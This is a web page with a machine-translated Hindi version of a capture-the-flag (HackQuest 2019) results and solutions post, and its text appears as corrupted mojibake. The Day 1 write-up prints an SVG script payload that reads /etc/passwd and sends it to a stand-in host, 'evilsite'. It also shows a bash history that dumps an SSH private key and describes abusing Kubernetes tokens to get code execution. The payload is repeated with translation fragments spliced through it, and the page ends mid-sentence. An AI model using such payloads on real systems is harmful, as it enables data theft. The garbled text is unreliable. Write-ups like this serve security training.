<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ЁЯЪз ЁЯЪП тШЭЁЯП╗ рдЬреАрд░реЛрдирд╛рдЗрдЯреНрд╕ рд╣реИрдХрдХреНрд╡реЗрд╕реНрдЯ 2019ред рдкрд░рд┐рдгрд╛рдо рдФрд░ рд▓рд┐рдЦрдирд╛ тЬКЁЯП╗ ЁЯИпя╕П ЁЯСйЁЯП╛</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="рд╣рд╛рд▓ рд╣реА рдореЗрдВ, рдЬреАрд░реЛрдирд╛рдЗрдЯреНрд╕ рд╕рдореНрдореЗрд▓рди рдХреЗ рд╕рд╛рде рдореЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдордпрдмрджреНрдз рд╡рд╛рд░реНрд╖рд┐рдХ рд╣реИрдХрдХреНрд╡реЗрд╕реНрдЯ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЧрдпрд╛ рд╣реИред рдкрд┐рдЫрд▓реЗ рд╡рд░реНрд╖реЛрдВ рдХреА рддрд░рд╣, рдкреНрд░рддрд┐рднрд╛рдЧрд┐рдпреЛрдВ рдХреЛ 7 рдЕрд▓рдЧ-рдЕрд▓рдЧ рдХрд╛рд░реН...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>рдЬреАрд░реЛрдирд╛рдЗрдЯреНрд╕ рд╣реИрдХрдХреНрд╡реЗрд╕реНрдЯ 2019ред рдкрд░рд┐рдгрд╛рдо рдФрд░ рд▓рд┐рдЦрдирд╛</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/472416/"><p> рд╣рд╛рд▓ рд╣реА рдореЗрдВ, рдЬреАрд░реЛрдирд╛рдЗрдЯреНрд╕ рд╕рдореНрдореЗрд▓рди рдХреЗ рд╕рд╛рде рдореЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдордпрдмрджреНрдз рд╡рд╛рд░реНрд╖рд┐рдХ рд╣реИрдХрдХреНрд╡реЗрд╕реНрдЯ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЧрдпрд╛ рд╣реИред  рдкрд┐рдЫрд▓реЗ рд╡рд░реНрд╖реЛрдВ рдХреА рддрд░рд╣, рдкреНрд░рддрд┐рднрд╛рдЧрд┐рдпреЛрдВ рдХреЛ 7 рдЕрд▓рдЧ-рдЕрд▓рдЧ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╣рд▓ рдХрд░рдирд╛ рдерд╛ - рдПрдХ рджрд┐рди рдХреА рдЦреЛрдЬ рдХреЗ рд▓рд┐рдПред  рдЕрд╕рд╛рдЗрдирдореЗрдВрдЯ, рд╣рдореЗрд╢рд╛ рдХреА рддрд░рд╣, рд╣рдорд╛рд░реЗ рд╕рд╛рдореБрджрд╛рдпрд┐рдХ рд╕рд╣рдпреЛрдЧрд┐рдпреЛрдВ рдХреЛ рддреИрдпрд╛рд░ рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХреАред  рдЖрдк рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХреИрд╕реЗ рд╣рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдФрд░ рдЬреЛ рдХрдЯ рдХреЗ рддрд╣рдд рдЗрд╕ рдмрд╛рд░ рд╣реИрдХрдХреНрд╡реЗрд╕реНрдЯ рдХреЗ рд╡рд┐рдЬреЗрддрд╛ рдмрдиреЗред </p><br><img src="https://habrastorage.org/webt/fg/tn/kk/fgtnkkl6yedcvzkmsnb_koppplo.jpeg" alt="рдЫрд╡рд┐"><br><a name="habracut"></a><br><h2>  рджрд┐рди 1. рд╢реАрд░реНрд╖ SECRET </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center">  рд╡рд┐рдЬреЗрддрд╛рдУрдВ </td></tr><tr><td align="center">  <b>рдкрд╣рд▓рд╛ рд╕реНрдерд╛рди</b> </td><td align="center">  <b>рджреВрд╕рд░рд╛ рд╕реНрдерд╛рди</b> </td></tr><tr><td align="center">  vladvis </td><td align="center">  gotdaswag </td></tr></tbody></table></div><br><p>  рдЗрд╕ рд╡рд░реНрд╖ рдХрд╛ рдкрд╣рд▓рд╛ рдЕрд╕рд╛рдЗрдирдореЗрдВрдЯ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдбрд┐рдЬрд┐рдЯрд▓ рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА</a> рдСрдбрд┐рдЯ рдЯреАрдо рджреНрд╡рд╛рд░рд╛ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред  рдЗрд╕реЗ рд╣рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдкреНрд░рддрд┐рднрд╛рдЧрд┐рдпреЛрдВ рдХреЛ рддреАрди рдЪрд░рдгреЛрдВ рд╕реЗ рдЧреБрдЬрд╝рд░рдирд╛ рдкрдбрд╝рд╛: рдЧреЗрдо рдкреЛрд░реНрдЯрд▓ рдХреА рдЖрдВрддрд░рд┐рдХ рдЪреИрдЯ рдХреА рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдБрдЪ, рдбрд┐рд╕реНрдХреЛрд░реНрдб рдмреЙрдЯ рдореЗрдВ рднреЗрджреНрдпрддрд╛ рдХрд╛ рд╢реЛрд╖рдг, рдФрд░ рдХреБрдмреЗрд░рдиреЗрдЯ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рдЧрд▓рдд рдЕрдзрд┐рдХрд╛рд░ рд╕реЗрдЯрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред </p><br><div class="spoiler">  <b class="spoiler_title">рдкрд╣рд▓реЗ рджрд┐рди рдХреЗ рдХрд╛рд░реНрдп рдХрд╛ рдирд┐рд░реНрдгрдп (vladvis)</b> <div class="spoiler_text"><h2>  рдкрд╣рд▓рд╛ рдЪрд░рдг: рдЧреНрд░рд╛рдлрдХрд▓ </h2><br><ul><li>  рдкреНрд░рд╛рд░рдВрдн рдореЗрдВ, рд╣рдо рдПрдХ js рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдЧреЗрдо рдФрд░ рд░реЗрдЯрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВред <br><img src="https://habrastorage.org/getpro/habr/post_images/9cf/5f7/9b1/9cf5f79b1b46572ab7a9672cd2aab2b1.png"></li><li>  рд╕реНрдерд┐рд░ рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдмреИрдХрдПрдВрдб рдореЗрдВ рдХреЗрд╡рд▓ 1 рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ: <br><img src="https://habrastorage.org/getpro/habr/post_images/751/d40/d27/751d40d27d15215ce845b84c9a9a9c06.png"></li><li>  рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреНрд╡реЗрд░реА рдХреЗ рд╕рд╛рде рд╕рднреА рдкреНрд░рдХрд╛рд░реЛрдВ рдФрд░ рдЙрдирдХреЗ рдХреНрд╖реЗрддреНрд░реЛрдВ рдХреА рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: <br><pre><code class="plaintext hljs">{ __schema { types { name fields { name } } } }</code> </pre> </li><li>  рд╣рдо рдЯрд┐рдкреНрдкрдгреА рдХреНрд╖реЗрддреНрд░ рджреЗрдЦрддреЗ рд╣реИрдВ, рдЗрд╕реЗ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЕрдЧрд▓реЗ рдЪрд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ рд▓рд┐рдВрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВред </li></ul><br><h2>  рджреВрд╕рд░рд╛ рдЪрд░рдг: рдмреЙрдЯ рдХреЛ рддреНрдпрд╛рдЧреЗрдВ </h2><br><ul><li>  рдПрдХ рдмреЙрдЯ рд╣рдореЗрдВ рд╕рд░реНрд╡рд░ рдкрд░ рдорд┐рд▓рддрд╛ рд╣реИ рдФрд░ рд╣рдорд╛рд░реЗ рд▓рд┐рдП рдПрдХ рдЕрд▓рдЧ рдЪреИрдирд▓ рдмрдирд╛рддрд╛ рд╣реИ <br><img src="https://habrastorage.org/getpro/habr/post_images/956/219/d71/956219d717f189f25cc3a61c749a8c18.png"></li><li>  рддреБрд░рдВрдд рд╣рдореЗрдВ gitea рдореЗрдВ SSRF рдХрд╛ рдПрдХ рд╕рдВрдХреЗрдд рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдореБрдЭреЗ рдРрд╕рд╛ рдХрднреА рдирд╣реАрдВ рдорд┐рд▓рд╛ = ( </li><li>  рд╣рдо рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ: <br><pre> <code class="plaintext hljs">&lt;svg width="10cm" height="3cm" viewBox="0 0 1000 300" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt; &lt;script type="text/javascript"&gt; for (var i=0; trefs[i]; i++) { var xhr = new XMLHttpRequest(); xhr.open("GET","/etc/passwd",false); xhr.send(""); var xhr2 = new XMLHttpRequest(); xhr2.open("GET", "http://evilsite/?p="+btoa(xhr.responseText),false); xhr2.send(""); } &lt;/script&gt; &lt;/svg&gt;</code> = "3 рд╕реЗрдореА" viewBox = " <code class="plaintext hljs">&lt;svg width="10cm" height="3cm" viewBox="0 0 1000 300" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt; &lt;script type="text/javascript"&gt; for (var i=0; trefs[i]; i++) { var xhr = new XMLHttpRequest(); xhr.open("GET","/etc/passwd",false); xhr.send(""); var xhr2 = new XMLHttpRequest(); xhr2.open("GET", "http://evilsite/?p="+btoa(xhr.responseText),false); xhr2.send(""); } &lt;/script&gt; &lt;/svg&gt;</code> etc / рдкрд╛рд╕рд╡рд░реНрдб", рдЭреВрдареА); <code class="plaintext hljs">&lt;svg width="10cm" height="3cm" viewBox="0 0 1000 300" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt; &lt;script type="text/javascript"&gt; for (var i=0; trefs[i]; i++) { var xhr = new XMLHttpRequest(); xhr.open("GET","/etc/passwd",false); xhr.send(""); var xhr2 = new XMLHttpRequest(); xhr2.open("GET", "http://evilsite/?p="+btoa(xhr.responseText),false); xhr2.send(""); } &lt;/script&gt; &lt;/svg&gt;</code> </pre> </li><li>  рд╣рдо / etc / passwd рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ 2 рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджреЗрдЦрддреЗ рд╣реИрдВ: рдХрд╛рд░реНрдпрдХрд░реНрддрд╛, рдЬрд┐рдирдХреА рдУрд░ рд╕реЗ svg рдФрд░ gitea рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ <br><pre> <code class="plaintext hljs">worker:x:1000:1000::/home/worker:/bin/sh gitea:x:1001:1001::/home/gitea:/bin/sh</code> / рд╢ <code class="plaintext hljs">worker:x:1000:1000::/home/worker:/bin/sh gitea:x:1001:1001::/home/gitea:/bin/sh</code> </pre> </li><li>  рдпрд╣ рдХрджрдо рдореИрдВ рдПрдХ рдЕрдирдкреЗрдХреНрд╖рд┐рдд рдорд╛рд░реНрдЧ рд╕реЗ рдЧреБрдЬрд░рд╛: in.bash_history, рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ ssh рдХреБрдВрдЬреА рдФрд░ рд╕рд░реНрд╡рд░ рдкрддреЗ рдХреЗ рд▓рд┐рдП рдЕрдЧрд▓реЗ рдЪрд░рдг рдХреЗ рд▓рд┐рдП рдкрде рдереЗ <br><pre> <code class="plaintext hljs">cd nano .ssh/connect_info echo &gt; .bash_history exit cd cd .ssh/ chmod 755 id_rsa ls -al cat id_rsa exit</code> </pre> <br><h2>  рддреАрд╕рд░рд╛ рдЪрд░рдг: рдХреБрдмреЗрд░рдиреЗрдЯреНрд╕ </h2></li><li>  рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдореИрдВ рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ рдЗрд╕ рдореБрдХрд╛рдо рдкрд░ рдкрд╣реБрдВрдЪрд╛ рд╣реВрдВред  .bash_history рдФрд░ ps рдЦрд╛рд▓реА рдереЗ, рдФрд░ рдЗрд╕ рдореИрдВрдиреЗ рдирд┐рд╖реНрдХрд░реНрд╖ рдирд┐рдХрд╛рд▓рд╛ рдХрд┐ рдПрдХ рдЕрд▓рдЧ рд╡рд╛рддрд╛рд╡рд░рдг рдкреНрд░рддреНрдпреЗрдХ рдЖрдИрдкреА рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╕реЗ <br><img src="https://habrastorage.org/getpro/habr/post_images/225/584/a43/225584a43fca0887057424b64a1ee1b4.jpg"></li><li>  рдорд╛рдЙрдВрдЯ рдореЗрдВ рдХреБрдмреЗрд░рдиреЗрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдПрдХ рдЯреЛрдХрди рдорд┐рд▓рд╛ <br><img src="https://habrastorage.org/getpro/habr/post_images/4d5/d0b/87e/4d5d0b87ed9b52c107a3d536cfb07f08.png"></li><li>  рдкрд╣рд▓реЗ рдпрд╣ рд╕реНрдкрд╖реНрдЯ рдирд╣реАрдВ рдерд╛ рдХрд┐ рдЯреЛрдХрди рдХрд╣рд╛рдБ рд╕реЗ рдорд┐рд▓реЗрдЧрд╛, рдФрд░ рдореИрдВрдиреЗ рдЧреНрд░рд┐рдб рдХреЛ рд╕реНрдХреИрди рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рджрд┐рдпрд╛ ... рдФрд░ рдХреБрдЫ рдмрд┐рдВрджреБ рдкрд░ рдореИрдВрдиреЗ рдкрдбрд╝реЛрд╕рд┐рдпреЛрдВ рдХреЛ рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдЪрд▓рдирд╛ рд╢реБрд░реВ рдХрд┐рдпрд╛ </li><li>  рдХрд┐ рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рд╕рдВрдХреЗрдд рдХреЗ рдмрд╛рдж, рдХрд┐рд╕реА рднреА рд╕рдмрдиреЗрдЯ рд╕реНрдХреИрди, рдФрд░ рд▓рдЧрднрдЧ рддреБрд░рдВрдд рдпрд╣ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдмрд╛рдХреА рдПрдкреАрдЖрдИ Kubernetes-рдПрдХ </li><li>  рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░, рдореБрдЭреЗ рдПрд╣рд╕рд╛рд╕ рд╣реБрдЖ рдХрд┐ рдореИрдВ рд╕рд░реНрд╡рд░ рдкрд░ рдЕрдХреЗрд▓рд╛ рдирд╣реАрдВ рдерд╛, рдФрд░ рдХреБрдЫ рдХрд╛рдЯрдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рдирд╣реАрдВ рдереА, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, cmdline рдорд╛рд╕реНрдХрд┐рдВрдЧ, рдЗрд╕рд▓рд┐рдП рдореИрдВрдиреЗ рдЗрд╕реЗ рдХрд░рдиреЗ рдХрд╛ рдлреИрд╕рд▓рд╛ рдХрд┐рдпрд╛ <del>  рдЖрд╕рд╛рди </del>  рдпрд╣ рдЕрдзрд┐рдХ рджрд░реНрджрдирд╛рдХ рд╣реИ рдФрд░ ssh рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдкрдиреЗ рдЖрдк рдХреЛ рдкреНрд░реЙрдХреНрд╕реА рдХреЛ рд╕реЙрдХреНрд╕ рдХрд░рддрд╛ рд╣реИ </li><li>  <code>kubectl get pods</code> рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рдХрдВрдЯреЗрдирд░реЛрдВ рдХреА рдПрдХ рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХреА рдЧрдИ рдереА, рдФрд░ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдХреБрдмреЗрд░рдиреЗрдЯреНрд╕ рдкреНрд░рд▓реЗрдЦрди</a> рдиреЗ рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдХрд┐ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдПрдХ рд╣реА рд╡рд╛рдХреНрдпрд╡рд┐рдиреНрдпрд╛рд╕ рдХреЗ рд╕рд╛рде <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">docker рдХреЗ</a> рд░реВрдк рдореЗрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ </li><li>  рддреЛ рдлрд┐рд░ рд╡рд╣рд╛рдБ рдореЛрдЬрд╝реЗ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬреЛ рдХрд╛рд░реНрдпрдХрд╛рд░реА рдХреЗ рд▓рд┐рдП WebSocket рдирд╣реАрдВ рд╣реБрдЖ рдерд╛ рдХреЗ рд╕рд╛рде рджреБрдЦ рдХреА 1.5 рдШрдВрдЯреЗ рдереЗред  рдореИрдВ рд╕рдорд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реАрдзреЗ ssh рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ kubectl рдЬрд╛ рд░рд╣рд╛ рд╣реВрдБ <br><img src="https://habrastorage.org/getpro/habr/post_images/f49/096/be8/f49096be8b3c769802f612325f70e7ba.png"></li><li>  рджреВрд╕рд░реЗ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдПрдХ рдирдпрд╛ рдЯреЛрдХрди рд╣реИ рдФрд░ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкрдбрд╝реЛрд╕реА рдирд╛рдорд╕реНрдерд╛рди zn2 рдореЗрдВ рдХреНрд▓рд╕реНрдЯрд░ рдХреА рдкрд╣реБрдВрдЪ рд╣реИ (рд╢реБрд░реВ рдореЗрдВ рд╣рдо рдирд╛рдорд╕реНрдерд╛рди zn1 рдореЗрдВ рд╣реИрдВ), рдЬрд┐рд╕рдореЗрдВ рд╕реЗ рд▓рд╛рд▓ рд░рдВрдЧ рджрд┐рдЦрд╛рдИ рджреЗ рд░рд╣рд╛ рдерд╛ </li><li>  рд╣рдо рдкрд┐рдЫрд▓реЗ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">Zeronights</a> рд╕реЗ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рд░рд┐рдкреЛрд░реНрдЯ</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">@paulaxe</a> рдХреЛ рдпрд╛рдж рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдЗрд╕ PoC</a> рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ </li><li>  рдЕрдЧрд▓рд╛ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЖрдк рдзреНрд╡рдЬ рдХреЛ рдХреБрдмреЗрд░рдиреЗрдЯ рдХреЗ рд░рд╣рд╕реНрдпреЛрдВ рд╕реЗ рдЦреАрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ <br><img src="https://habrastorage.org/getpro/habr/post_images/71e/49d/172/71e49d172f647b8311233e5646dd9170.png"></li></ul></div></div><br><h2>  рджрд┐рди 2. MICOSOFT LUNIX </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center">  рд╡рд┐рдЬреЗрддрд╛рдУрдВ </td></tr><tr><td align="center">  <b>рдкрд╣рд▓рд╛ рд╕реНрдерд╛рди</b> </td><td align="center">  <b>рджреВрд╕рд░рд╛ рд╕реНрдерд╛рди</b> </td><td align="center">  <b>рддреАрд╕рд░рд╛ рд╕реНрдерд╛рди</b> </td></tr><tr><td align="center">  рдлрдЯреЗ </td><td align="center">  Sin__ </td><td align="center">  AV1ct0r </td></tr><tr><td colspan="3" align="center">  рдпрд╣ рднреА рддрдп рдХрд┐рдпрд╛: demidov_al, gotdaswag, medidrdrider, groke_is_love_groke_is_life </td></tr></tbody></table></div><br><p>  рджреВрд╕рд░реЗ рджрд┐рди рдХрд╛ рдЕрд╕рд╛рдЗрдирдореЗрдВрдЯ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">r0 рдХреНрд░реВ</a> рд╕рдореБрджрд╛рдп рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред  рдЗрд╕реЗ рд╣рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдПрдХ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реНрдиреЗрд▓ рдХреЗ рд╕рд╛рде рд▓рд┐рдирдХреНрд╕ рдЫрд╡рд┐ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд░рд┐рдпрдг рдХреБрдВрдЬреА рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред </p><br><div class="spoiler">  <b class="spoiler_title">рджреВрд╕рд░реЗ рджрд┐рди рдХреЗ рдХрд╛рд░реНрдп рдХрд╛ рдирд┐рд░реНрдгрдп (рдлрд╛рдбрд╝рд╛)</b> <div class="spoiler_text"><p>  рджрд┐рдпрд╛ рдЧрдпрд╛: <code>jD74nd8_task2.iso</code> рдлрд╝рд╛рдЗрд▓, рдмреВрдЯ рдХрд░рдиреЗ рдпреЛрдЧреНрдп ISO рдЫрд╡рд┐ред  рдЫрд╡рд┐ рдХреЗ рдЕрдВрджрд░ рдХреА рдлрд╝рд╛рдЗрд▓реЛрдВ рд╕реЗ, рд╣рдо рдпрд╣ рдорд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рд▓рд┐рдирдХреНрд╕ рд╣реИ: рдПрдХ рдХрд░реНрдиреЗрд▓ <code>boot/kernel.xz</code> рдХрд░реНрдиреЗрд▓ рд╣реИред <code>boot/kernel.xz</code> , рдПрдХ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд░реИрдордбрд┐рд╕реНрдХ <code>boot/rootfs.xz</code> рдФрд░ рдПрдХ рдмреВрдЯ рд▓реЛрдбрд░ <code>boot/syslinux/</code> ред </p><br><p>  рд╣рдо рдХреЛрд░ рдФрд░ рд░реИрдордбрд┐рд╕реНрдХ рдХреЛ рдЕрдирдкреИрдХ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВред  рд░рд╛рдордбрд┐рд╕реНрдХ рдпрд╣рд╛рдБ рдПрдХ рдирд┐рдпрдорд┐рдд cpio рд╕рдВрдЧреНрд░рд╣ рд╣реИ рдЬрд┐рд╕реЗ xz рджреНрд╡рд╛рд░рд╛ рд╕рдВрдкреАрдбрд╝рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред  рд╕реНрдХреНрд░рд┐рдкреНрдЯ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux</a> рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░реНрдиреЗрд▓ рдХреЛ рдЕрдирдкреИрдХ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдХрд░реЗрдВ</a> ред  рдЖрдк рдХрд░реНрдиреЗрд▓ рдЬрд╛рдирдХрд╛рд░реА рдкрд░ рднреА рдзреНрдпрд╛рди рджреЗ рд╕рдХрддреЗ рд╣реИрдВ: </p><br><pre> <code class="plaintext hljs">&gt; file kernel.xz kernel.xz: Linux kernel x86 boot executable bzImage, version 5.0.11 (billy@micosoft.com) #1 SMP Sat Aug 25 13:37:00 CEST 2019, RO-rootFS, swap_dev 0x2, Normal VGA</code> </pre> <br><p>  рдЬрд┐рд╕ рддрд░рд╣ рд╕реЗ, рд╣рдо рдЖрдИрдПрд╕рдУ рдЗрдореЗрдЬ рдореЗрдВ <code>minimal/rootfs/bin/activator</code> рдХрд╛ рдореБрдЦреНрдп рдХрд╛рдо рдкрд╛рддреЗ рд╣реИрдВ: рдпрд╣ рд╕рднреА рдбрд┐рд╡рд╛рдЗрд╕ рдореЗрдВ рджрд░реНрдЬ рдИрдореЗрд▓ рдбреЗрдЯрд╛ рдФрд░ рдПрдХреНрдЯрд┐рд╡реЗрд╢рди рдХреБрдВрдЬреА рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдиреАрдЪреЗ рдЖрддрд╛ рд╣реИ <code>/dev/activate</code> рдлреЙрд░рдореИрдЯ <code>/dev/activate</code> <code>$email|$key</code> рдореЗрдВ <code>/dev/activate</code> рд╣реИред <code>$email|$key</code> |  рд╕рдлрд▓ рд╕рддреНрдпрд╛рдкрди рдХреБрдВрдЬреА рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ рд╕реЗ рдкрдврд╝рд╛ <code>/dev/activate</code> рд╕реНрдЯреНрд░рд┐рдВрдЧ рдЬрд╛рд░реА рдХрд░реЗрдЧрд╛ <code>ACTIVATED</code> , рдЙрддреНрдкреНрд░реЗрд░рдХ рдФрд░ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЦреЗрд▓ 2048 рдореЗрдВ рд╢реБрд░реВ рд╣реЛрдЧрд╛ред </p><br><p>  рдпрд╣ рд╕рдордп рдЧрддрд┐рд╢реАрд▓рддрд╛ рдореЗрдВ рдХрд╛рд░реНрдп рдХреЛ 